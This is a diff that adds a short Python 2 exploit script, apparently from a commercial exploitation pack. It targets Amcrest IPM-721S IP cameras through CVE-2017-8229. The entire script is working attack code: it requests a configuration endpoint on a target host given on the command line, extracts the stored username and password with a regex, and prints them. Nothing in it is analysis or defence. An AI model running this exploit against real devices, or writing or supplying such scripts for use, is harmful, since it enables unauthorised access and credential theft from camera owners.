@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_amcrest_1'
+_vendor_ = 'amcrest'
+_model_  = ['IPM-721S']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2017-8229'
+_ref_    = 'https://dl.packetstormsecurity.net/1906-exploits/Amcrest_sec_issues.pdf'
+_port_   = 8080
+
+def pwnrouter(host,port=_port_):  
+  try:
+    url = 'http://%s:%d/current_config/Sha1Account1' % (host,port)        
+    response = requests.get(url, allow_redirects=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return   
+  m = re.search('"Name" : "([^"]+)",\\s+"Password" : "([^"]+)",', response.text)
+  if m is None:
+    print '[+] %s not vulnerable' % host
+    return                
+  print '[+] %s vulnerable' % host
+  print '[+] Username: %s'%m.group(1)
+  print '[+] Password: %s'%m.group(2)        
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
